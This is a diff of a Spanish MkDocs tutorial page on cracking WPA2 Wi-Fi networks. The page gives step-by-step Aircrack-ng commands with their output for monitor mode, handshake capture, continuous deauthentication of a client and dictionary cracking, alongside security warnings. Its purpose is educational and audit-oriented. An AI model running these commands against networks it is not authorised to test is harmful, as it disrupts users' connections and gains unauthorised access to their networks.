@@ -2,7 +2,7 @@
 
 
 
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en" class="no-js">
   <head>
     
@@ -10,7 +10,11 @@
       <meta name="viewport" content="width=device-width,initial-scale=1">
       <meta http-equiv="x-ua-compatible" content="ie=edge">
       
+        <meta name="description" content="Análisis de las vulnerabilidades presentes en un entorno doméstico">
       
+      
+      
+        <meta name="author" content="Héctor Romero <i72roloh@uco.es>">
       
       
         <meta name="lang:clipboard.copy" content="Copy to clipboard">
@@ -32,20 +36,20 @@
         <meta name="lang:search.tokenizer" content="[\s\-]+">
       
       <link rel="shortcut icon" href="../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-3.1.0">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.0.2">
     
     
       
-        <title>Cracking de  redes Wifi - Hacking Doméstico</title>
+        <title>Cracking de  redes Wifi - Seguridad en redes domésticas</title>
       
     
     
-      <link rel="stylesheet" href="../assets/stylesheets/application.11e41852.css">
+      <link rel="stylesheet" href="../assets/stylesheets/application.982221ab.css">
       
       
     
     
-      <script src="../assets/javascripts/modernizr.20ef595d.js"></script>
+      <script src="../assets/javascripts/modernizr.1f0bcf2b.js"></script>
     
     
       
@@ -56,6 +60,9 @@
     
     <link rel="stylesheet" href="../assets/fonts/material-icons.css">
     
+    
+    
+      
     
     
   </head>
@@ -72,7 +79,7 @@
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
     <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
     
-      <a href="#vulnerabilidades-en-redes-wifi" tabindex="1" class="md-skip">
+      <a href="#explotacion-de-vulnerabilidades-en-redes-wifi" tabindex="1" class="md-skip">
         Skip to content
       </a>
     
@@ -81,7 +88,7 @@
   <nav class="md-header-nav md-grid">
     <div class="md-flex">
       <div class="md-flex__cell md-flex__cell--shrink">
-        <a href=".." title="Hacking Doméstico" class="md-header-nav__button md-logo">
+        <a href=".." title="Seguridad en redes domésticas" class="md-header-nav__button md-logo">
           
             <i class="md-icon"></i>
           
@@ -93,22 +100,19 @@
       <div class="md-flex__cell md-flex__cell--stretch">
         <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
           
-            
-              <span class="md-header-nav__topic">
-                Hacking Doméstico
-              </span>
-              <span class="md-header-nav__topic">
-                Cracking de  redes Wifi
-              </span>
-            
+            <span class="md-header-nav__topic">
+              Seguridad en redes domésticas
+            </span>
+            <span class="md-header-nav__topic">
+              Cracking de  redes Wifi
+            </span>
           
         </div>
       </div>
       <div class="md-flex__cell md-flex__cell--shrink">
         
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
           
-            <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
-            
 <div class="md-search" data-md-component="search" role="dialog">
   <label class="md-search__overlay" for="__search"></label>
   <div class="md-search__inner" role="search">
@@ -131,7 +135,6 @@
     </div>
   </div>
 </div>
-          
         
       </div>
       
@@ -153,12 +156,12 @@
                   <div class="md-sidebar__inner">
                     <nav class="md-nav md-nav--primary" data-md-level="0">
   <label class="md-nav__title md-nav__title--site" for="__drawer">
-    <a href=".." title="Hacking Doméstico" class="md-nav__button md-logo">
+    <a href=".." title="Seguridad en redes domésticas" class="md-nav__button md-logo">
       
         <i class="md-icon"></i>
       
     </a>
-    Hacking Doméstico
+    Seguridad en redes domésticas
   </label>
   
   <ul class="md-nav__list" data-md-scrollfix>
@@ -169,8 +172,8 @@
 
 
   <li class="md-nav__item">
-    <a href=".." title="Index" class="md-nav__link">
-      Index
+    <a href=".." title="Inicio" class="md-nav__link">
+      Inicio
     </a>
   </li>
 
@@ -333,8 +336,8 @@
 
 
   <li class="md-nav__item">
-    <a href="../networkAttack/" title="Explorando la red interna" class="md-nav__link">
-      Explorando la red interna
+    <a href="../networkAttack/" title="Atacando la red interna" class="md-nav__link">
+      Atacando la red interna
     </a>
   </li>
 
@@ -345,8 +348,8 @@
 
 
   <li class="md-nav__item">
-    <a href="../javascript/" title="POC: Inyectando Javscript Malicioso" class="md-nav__link">
-      POC: Inyectando Javscript Malicioso
+    <a href="../javascript/" title="POC: Inyectando Javascript Malicioso" class="md-nav__link">
+      POC: Inyectando Javascript Malicioso
     </a>
   </li>
 
@@ -449,30 +452,44 @@
               
                 
                 
-                <h1 id="vulnerabilidades-en-redes-wifi">Vulnerabilidades en redes wifi</h1>
+                <h1 id="explotacion-de-vulnerabilidades-en-redes-wifi">Explotación de vulnerabilidades en redes Wifi<a class="headerlink" href="#explotacion-de-vulnerabilidades-en-redes-wifi" title="Permanent link">&para;</a></h1>
 <p>Como se ha detallado en el apartado anterior encontramos diferentes aspectos dentro de una red wifi que deben de ser analizados. Para realizar análisis de redes wifi disponemos de la suite <a href="https://www.aircrack-ng.org/"><strong>Aircrack-ng</strong></a>, la cual nos brinda numerosas herramientas para poder realizar dicho análisis.</p>
-<h2 id="que-es-el-modo-monitor">¿Qué es el modo monitor?</h2>
+<h2 id="que-es-el-modo-monitor">¿Qué es el modo monitor?<a class="headerlink" href="#que-es-el-modo-monitor" title="Permanent link">&para;</a></h2>
 <p>Antes de entrar en materia, es necesario introducir un concepto nuevo en el ámbito de las redes wifi: <em>monitor mode</em>. Haciendo una simple búsqueda en Wikipedia encontramos:</p>
 <p><code>Monitor mode, or RFMON (Radio Frequency MONitor) mode, allows a computer with a wireless network interface controller (WNIC) to monitor all traffic received on a wireless channel. Unlike promiscuous mode, which is also used for packet sniffing, monitor mode allows packets to be captured without having to associate with an access point or ad hoc network first</code></p>
 <p>Traduciendo al español (la parte que nos interesa) concluimos que el modo monitor nos permite capturar paquetes sin necesidad de estar asociado a un punto de acceso. Esta funcionalidad que nos permiten determinadas chips de tarjetas wifi será esencial para analizar las diferentes redes de nuestro entorno.</p>
-<h3 id="como-comprobar-si-la-tarjeta-es-compatible">¿Cómo comprobar si la tarjeta es compatible?</h3>
+<h3 id="como-comprobar-si-la-tarjeta-es-compatible">¿Cómo comprobar si la tarjeta es compatible?<a class="headerlink" href="#como-comprobar-si-la-tarjeta-es-compatible" title="Permanent link">&para;</a></h3>
 <p>Una vez que ha quedado claro que es el modo monitor y para que sirve, se recomienda <strong>utilizar tarjetas externas</strong> por dos razones principales:</p>
 <ul>
 <li>El chipset de las tarjetas externas brindan mejor soporte para modo monitor.</li>
 <li>La tarjeta wifi interna puede ser dañada debido al procesamiento de paquetes.</li>
 </ul>
 <p>Dicho esto, lo primero que tenemos que realizar sería comprobar que tenemos una tarjeta que soporte el modo monitor, para ello utilizaremos el siguiente comando:</p>
-<pre><code>    $ iw list
-</code></pre>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    $ iw list
+</pre></div>
+</td></tr></table>
+
 <p>Dentro de la salida extensa de este comando tenemos la categoria <em>Supported interface modes</em> donde podemos comprobar si se incluye el modo monitor.</p>
-<h3 id="activando-el-modo-monitor-airmon-ng">Activando el modo monitor: airmon-ng</h3>
+<h3 id="activando-el-modo-monitor-airmon-ng">Activando el modo monitor: airmon-ng<a class="headerlink" href="#activando-el-modo-monitor-airmon-ng" title="Permanent link">&para;</a></h3>
 <p>Una vez comprobado si la tarjeta es compatible, pasaremos a ponerla el modo monitor. </p>
 <p><code>Aircrack-ng requiere ser ejecutado como root</code>
 <code>Para los ejemplos de comandos se utilizará la interfaz wlan1, esto debe de ser cambiado según la interfaz</code></p>
-<pre><code>$ root@HowIsCoding:~$  airmon-ng check wlan1
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>$ root@HowIsCoding:~$  airmon-ng check wlan1
 
 Found 5 processes that could cause trouble.
-Kill them using 'airmon-ng check kill' before putting
+Kill them using &#39;airmon-ng check kill&#39; before putting
 the card in monitor mode, they will interfere by changing channels
 and sometimes putting the interface back in managed mode
 
@@ -482,13 +499,28 @@ PID Name
 8878 NetworkManager
 9214 avahi-daemon
 9225 avahi-daemon
-</code></pre>
+</pre></div>
+</td></tr></table>
+
 <p>Antes de poner la interfaz en modo monitor debemos de realizar una comprobación en busca de procesos (como el network Manager) que esten utilizando la interfaz, de forma que tendremos que matarlos. Si dejamos estos procesos corriendo pueden realizar acciones como cambiar la antena de canal o impedirla trabajar el modo monitor. </p>
 <p>Para matar estos procesos simplemente usamos la herramienta airmon-ng para matarlos:</p>
-<pre><code>$ airmon-ng check kill
-</code></pre>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>$ airmon-ng check kill
+</pre></div>
+</td></tr></table>
+
+<div class="admonition info">
+<p class="admonition-title">Info</p>
+<p>Posteriormente tendremos que habilitar el proceso <em>network-manager</em> para conectarnos a la red wifi. También será necesario desactivar la interfaz de modo monitor.</p>
+</div>
 <p>Cuando tenemos los procesos que entraban en conflicto matados podemos pasar a poner la interfaz en modo monitor, para ello usaremos la misma herramienta:</p>
-<pre><code>$ airmon-ng start wlan1
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4
+5
+6
+7
+8</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>$ airmon-ng start wlan1
 
 PHY Interface   Driver      Chipset
 
@@ -496,20 +528,54 @@ phy0    wlan1       ath9k_htc   Atheros Communications, Inc. AR9271 802.11n
 
     (mac80211 monitor mode vif enabled for [phy0]wlan1 on [phy0]wlan1mon)
     (mac80211 station mode vif disabled for [phy0]wlan1)
-</code></pre>
-<p>Como podemos ver en la salida del comando airmon-ng se ha habilitado el modo monitor de nuestra tarjeta. Para operar con el momo monitor se habilita la interfaz wlan1mon.</p>
-<p>Podemos comprobar los canales Wifi en los que esta ecuchando nuestra tarjeta en modo monitor, para ello podemos usar el comando:</p>
-<pre><code>$ iwlist wlan1mon channel
-</code></pre>
+</pre></div>
+</td></tr></table>
+
+<p>Como podemos ver en la salida del comando airmon-ng se ha habilitado el modo monitor de nuestra tarjeta. Para operar con el modo monitor se habilita la interfaz wlan1mon.</p>
+<p>Podemos comprobar los canales Wifi en los que esta escuchando nuestra tarjeta en modo monitor, para ello podemos usar el comando:</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>$ iwlist wlan1mon channel
+</pre></div>
+</td></tr></table>
+
 <p>Cuando hemos encontrado la red que queremos auditar (como se explicará en el siguiente apartado), podemos suministrar el canal como argumento opcional a airmon-ng, de la siguiente forma:</p>
-<pre><code>$ airmon-ng start wlan1 3
-</code></pre>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>$ airmon-ng start wlan1 3
+</pre></div>
+</td></tr></table>
+
 <p>Al igual que podemos poner la tarjeta en modo monitor, cuando terminemos de trabajar con ella debemos desactivarla, para ello airmon-ng nos permite desactivarlo haciendo uso del comando:</p>
-<pre><code>$ airmon-ng stop wlan1
-</code></pre>
-<h2 id="escaneando-redes-wifi-airodump-ng">Escaneando redes wifi: airodump-ng</h2>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>$ airmon-ng stop wlan1
+</pre></div>
+</td></tr></table>
+
+<h2 id="escaneando-redes-wifi-airodump-ng">Escaneando redes wifi: airodump-ng<a class="headerlink" href="#escaneando-redes-wifi-airodump-ng" title="Permanent link">&para;</a></h2>
 <p>Una vez con nuestra interfaz en modo monitor pasaremos a realizar un escaneo de todas las redes wifi que estan en nuestro entorno, para ello utilizaremos la herramienta <em>airodump-ng</em></p>
-<pre><code>$ airodump-ng wlan1mon
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>$ airodump-ng wlan1mon
 
 CH 12 ][ Elapsed: 12 s ][ 2019-01-13 13:34
 
@@ -527,7 +593,7 @@ CH 12 ][ Elapsed: 12 s ][ 2019-01-13 13:34
  B0:4E:26:1D:93:57  -74        2        0    0   6   54  WPA2 CCMP   PSK  TP-Link_9358        
  EC:08:6B:AB:77:F0  -75        4        0    0   3   54  WPA2 CCMP   PSK  TP-LINK_77F0       
  F4:F2:6D:2C:58:99  -83        1        2    0   9   54  WPA2 CCMP   PSK  Ororo _EXT          
- F4:F2:6D:EC:C4:71  -83        0       22    0  10  -1   WPA              &lt;length:  0&gt;        
+ F4:F2:6D:EC:C4:71  -83        0       22    0  10  -1   WPA              &amp;lt;length:  0&amp;gt;        
 00:16:0A:13:DB:42  -85        5        0    0  11  54 . WPA2 CCMP   PSK  RAFAELA
 
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe
@@ -536,18 +602,35 @@ BSSID              STATION            PWR   Rate    Lost    Frames  Probe
 94:6A:B0:CB:6F:EA  7C:8B:CA:6C:85:81  -29    5e- 0e     0       76                           
 F8:FB:56:28:37:01  E4:0E:EE:44:DF:24  -72    1e- 1      0        4                           
 EC:08:6B:AB:77:F0  4C:74:03:70:7C:3A  -85    0 - 6      0        1
-</code></pre>
-<p><code>` La terminología usada en el resultado de este comando esta explicada en el apartado anterior</code></p>
+</pre></div>
+</td></tr></table>
+
+<p><code>La terminología usada en el resultado de este comando esta explicada en el apartado anterior</code></p>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<p>Detectamos en el escaneo una red OPN, esto quiere decir que no posee cifrado. Dejar una red sin cifrado (aunque sea una pública) puede desembocar y graves problemas de seguridad. Siempre es recomendado tener habilitado el protocolo WPA2 CCMP  o WPA3 al ser el protocolo más robusto.</p>
+</div>
 <p>Airodump-ng realizará un escaneo por todos los canales de radio referentes a las redes wifi e irá buscando las diferentes señales y los clientes conectados a la mismas.</p>
-<p>Este resultado nos será útil para identificar todas las señales wifi de nuestro entorno, así como los cientes conectados a estas. Tenemos que tener en cuenta que si un punto de acceso tiene clientes conectados, el proceso de obtención de la contraseña será más fácil de realizar.</p>
-<h3 id="limitando-el-rango-de-busqueda">Limitando el rango de búsqueda</h3>
+<p>Este resultado nos será útil para identificar todas las señales wifi de nuestro entorno, así como los clientes conectados a estas. Tenemos que tener en cuenta que si un punto de acceso tiene clientes conectados, el proceso de obtención de la contraseña será más fácil de realizar.</p>
+<h3 id="limitando-el-rango-de-busqueda">Limitando el rango de búsqueda<a class="headerlink" href="#limitando-el-rango-de-busqueda" title="Permanent link">&para;</a></h3>
 <p>En el anterior ejemplo estabamos haciendo una captura de todos los canales wifi, de forma que nuestra interfaz (en modo monitor) iba cambiando constantemente de canal para encontrar los clientes y puntos de acceso de cada canal.</p>
-<p>Sin embargo, cuando estamos trabando con un objetivo en concretp tenemos que  capturar información  exclusivamente de dicho AP para ello tenemos que  especificar su dirección MAC(bssid) y Canal en el que emite podemos obtener mayor información de esta red, indicaremos también un fichero donde almacenar la información que capturemos, de forma que el handsake quede almacenado para posteior tratamiento.</p>
-<pre><code>$ airodump-ng --bssid 7C:8B:CA:6C:85:80 -c 4 -w capture wlan1mon
-</code></pre>
+<p>Sin embargo, cuando estamos trabando con un objetivo en concreto tenemos que  capturar información  exclusivamente de dicho AP para ello tenemos que  especificar su dirección MAC(bssid) y Canal en el que emite podemos obtener mayor información de esta red, indicaremos también un fichero donde almacenar la información que capturemos, de forma que el handshake quede almacenado para posterior tratamiento.</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>$ airodump-ng --bssid 7C:8B:CA:6C:85:80 -c 4 -w capture wlan1mon
+</pre></div>
+</td></tr></table>
+
 <p>Este comando nos dará como resultado un paquete <em>cap</em>(capture.cap) para analizar posteriormente.</p>
 <p>Tenemos que esperar hasta que capturemos el handsake, es decir, tenemos que esperar hasta que un cliente se conecte al punto de acceso y por ende comience el proceso de autenticación descrito anteriormente.</p>
-<pre><code>$ CH  4 ][ Elapsed: 30 s ][ 2019-01-13 13:46 ][ WPA handshake: 7C:8B:CA:6C:85:80
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>$ CH  4 ][ Elapsed: 30 s ][ 2019-01-13 13:46 ][ WPA handshake: 7C:8B:CA:6C:85:80
 
  BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
 
@@ -557,24 +640,33 @@ EC:08:6B:AB:77:F0  4C:74:03:70:7C:3A  -85    0 - 6      0        1
 
  7C:8B:CA:6C:85:80  CC:9F:7A:1D:02:27  -35    0e- 0e   108      317  TP-Link_8580             
  7C:8B:CA:6C:85:80  10:02:B5:8A:95:26  -42    0e- 6e     0    12360
-</code></pre>
+</pre></div>
+</td></tr></table>
+
 <p>En este momento hemos obtenido el handsake referente al AP, de forma que podemos detener la captura de paquetes.</p>
-<h2 id="generando-trafico-wifi-aireplay-ng">Generando tráfico Wifi: aireplay-ng</h2>
+<h2 id="generando-trafico-wifi-aireplay-ng">Generando tráfico Wifi: aireplay-ng<a class="headerlink" href="#generando-trafico-wifi-aireplay-ng" title="Permanent link">&para;</a></h2>
 <p>aireplay-ng es una herramienta dentro de la suite que nos permite generar tráfico para posteiormente utilizarlo en el proceso de craking de contraseñas WEP o WPA PSK. </p>
 <p>En nuestro caso, estamos trabajando en una red WPA PSK. Cuando encontramos un cliente conectado a esta red, el proceso de captura de handsake parece imposible (puesto que el handsake se obtiene durante el proceso de autenticación), por lo cual, tendríamos que esperar a que el cliente u otro nuevo se conecte, en este punto es donde entra en juego aireplay.</p>
-<p>Podemos enviar paquetes que permite desautenticar a los clientes de una red, dichos clietnes, posteriormente se verán obligados a conectarse y nosotros capturaremos el handsake.</p>
+<p>Podemos enviar paquetes que permite desautenticar a los clientes de una red, dichos clientes, posteriormente se verán obligados a conectarse y nosotros capturaremos el handsake.</p>
 <p>Con aireplay-ng podemos enviar diferente tipo de tráfico, sin embargo, como hemos mencionado en nuestro caso nos interesa desauntenticar al usuario, para ello usaremos:</p>
-<pre><code>$ root@kali:~# aireplay-ng -0 0 -a 7C:8B:CA:6C:85:80 -c CC:9F:7A:1D:02:27 wlan1mon             
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4
+5
+6</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>$ root@kali:~# aireplay-ng -0 0 -a 7C:8B:CA:6C:85:80 -c CC:9F:7A:1D:02:27 wlan1mon             
 14:05:50  Waiting for beacon frame (BSSID: 7C:8B:CA:6C:85:80) on channel 4                   
 14:05:51  Sending 64 directed DeAuth (code 7). STMAC: [CC:9F:7A:1D:02:27] [19|65 ACKs]       
 14:05:51  Sending 64 directed DeAuth (code 7). STMAC: [CC:9F:7A:1D:02:27] [ 0|58 ACKs]       
 14:05:52  Sending 64 directed DeAuth (code 7). STMAC: [CC:9F:7A:1D:02:27] [ 0|61 ACKs]       
 14:05:53  Sending 64 directed DeAuth (code 7). STMAC: [CC:9F:7A:1D:02:27] [ 0|66 ACKs]
-</code></pre>
+</pre></div>
+</td></tr></table>
+
 <p>En este comando, estamos especificando los siguientes parámetros:</p>
 <ul>
 <li>
-<p>-0 0 --&gt; Indicamos que es un ataque de desautenticación. Con 0 indicamos el intervalo de nvío, en este caso continuamente</p>
+<p>-0 0 --&gt; Indicamos que es un ataque de desautenticación. Con 0 indicamos el intervalo de envío, en este caso continuamente</p>
 </li>
 <li>
 <p>-a --&gt; Indicamos la dirección MAC del punto de acceso</p>
@@ -583,10 +675,29 @@ EC:08:6B:AB:77:F0  4C:74:03:70:7C:3A  -85    0 - 6      0        1
 <p>-c --&gt; Indicamos la dirección MAC del cliente para desautenticar</p>
 </li>
 </ul>
-<p>Pasando un tiempo, el cliente será desautenticado y automaticamente intentará volver a conectarse (de forma manual o automática), será en ese momento donde podamos caputar el handsake.</p>
-<h2 id="obteniendo-la-contrasena-aircrack-ng">Obteniendo la contraseña: aircrack-ng</h2>
-<p>aircrack-ng es la herramienta que nos permite crackear la contraseña, podemos utilizar diferentes métodos, en este caso vamos a realizar un ataque por diccionario. Podemos utilizar otros métodos como cracking mediante gpu haciendo uso de herramientas como <em>pyrit</em>.</p>
-<pre><code>$ aircrack-ng -w passwordList capture-01.cap
+<p>Pasando un tiempo, el cliente será desautenticado y automaticamente intentará volver a conectarse (de forma manual o automática), será en ese momento donde podamos capturar el handsake.</p>
+<h2 id="obteniendo-la-contrasena-aircrack-ng">Obteniendo la contraseña: aircrack-ng<a class="headerlink" href="#obteniendo-la-contrasena-aircrack-ng" title="Permanent link">&para;</a></h2>
+<p>aircrack-ng es la herramienta que nos permite crackear la contraseña, podemos utilizar diferentes métodos, en este caso vamos a realizar un ataque por diccionario. Podemos utilizar otros métodos como cracking mediante gpu haciendo uso de herramientas como <a href="https://github.com/JPaulMora/Pyrit"><em>pyrit</em></a>.</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>$ aircrack-ng -w passwordList capture-01.cap
 
                        Aircrack-ng 1.5.2
 
@@ -606,8 +717,15 @@ EC:08:6B:AB:77:F0  4C:74:03:70:7C:3A  -85    0 - 6      0        1
                    EC E3 C5 E3 BF 4B 9A 1E 52 48 37 68 DA 8F 32 30
 
   EAPOL HMAC     : 79 F3 A9 F9 FA CA 60 C6 4E 45 8C 3D B6 77 0C D2
-</code></pre>
+</pre></div>
+</td></tr></table>
+
 <p>Tras realizar el ataque, si este ha concluido satisfactoriamente, encontraremos la contraseña, así como las diferentes claves utilizadas durante el proceso.</p>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<p>El cracking de la contraseña se ha realizado tan rápido a causa de que la contraseña esta dentro de un diccionario. Las contraseñas por defecto suelen estar en los diferentes diccionarios disponibles por internet.</p>
+<p>A pesar de que la contraseña no este dentro de un diccionario podemos realizar un ataque usando procesamiento por GPU, de forma que si es simple la contraseña conllevará muy poco tiempo obtenerla.</p>
+</div>
                 
                   
                 
@@ -643,13 +761,13 @@ EC:08:6B:AB:77:F0  4C:74:03:70:7C:3A  -85    0 - 6      0        1
           </a>
         
         
-          <a href="../networkAttack/" title="Explorando la red interna" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+          <a href="../networkAttack/" title="Atacando la red interna" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
             <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
               <span class="md-flex__ellipsis">
                 <span class="md-footer-nav__direction">
                   Next
                 </span>
-                Explorando la red interna
+                Atacando la red interna
               </span>
             </div>
             <div class="md-flex__cell md-flex__cell--shrink">
@@ -671,20 +789,15 @@ EC:08:6B:AB:77:F0  4C:74:03:70:7C:3A  -85    0 - 6      0        1
           Material for MkDocs</a>
       </div>
       
-        
-      
     </div>
   </div>
 </footer>
       
     </div>
     
-      <script src="../assets/javascripts/application.9e1f3b71.js"></script>
+      <script src="../assets/javascripts/application.d9aa80ab.js"></script>
       
       <script>app.initialize({version:"1.0.4",url:{base:".."}})</script>
-      
-    
-    
       
     
   </body>
